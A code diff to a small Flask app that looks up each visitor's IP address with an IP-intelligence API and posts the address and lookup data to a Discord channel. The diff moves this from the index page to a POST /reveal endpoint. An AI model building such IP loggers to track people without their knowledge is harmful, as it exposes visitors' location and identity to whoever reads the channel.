@@ -72,15 +72,26 @@ def send_ip_to_discord(ip, data):
         print("Channel not found. Is the bot connected?")
 
 @app.route("/", methods=["GET"])
-def get_ip():
+#def get_ip():
+def render_page():
+    #forwarded = request.headers.get('X-Forwarded-For', request.remote_addr)
+    #ip = forwarded.split(',')[0].strip()
+    # Make a request to the Abstract API to get IP intelligence data
+    #response = requests.get(f"https://ip-intelligence.abstractapi.com/v1/?api_key={ABSTRACT_API_KEY}&ip_address=" + ip)
+    #data = json.loads(response.text)
+    #send_ip_to_discord(ip, data)
+    #return response.json()  # Return the JSON response directly
+    return render_template("index.html")
+
+@app.route("/reveal", methods=["POST"])
+def reveal_ip():
     forwarded = request.headers.get('X-Forwarded-For', request.remote_addr)
     ip = forwarded.split(',')[0].strip()
-    # Make a request to the Abstract API to get IP intelligence data
     response = requests.get(f"https://ip-intelligence.abstractapi.com/v1/?api_key={ABSTRACT_API_KEY}&ip_address=" + ip)
     data = json.loads(response.text)
     send_ip_to_discord(ip, data)
-    #return response.json()  # Return the JSON response directly
-    return render_template("index.html")
+    return jsonify({"ip": ip})
+
 
 def run_flask():
     app.run(host='0.0.0.0', port=OUTSIDE_PORT)
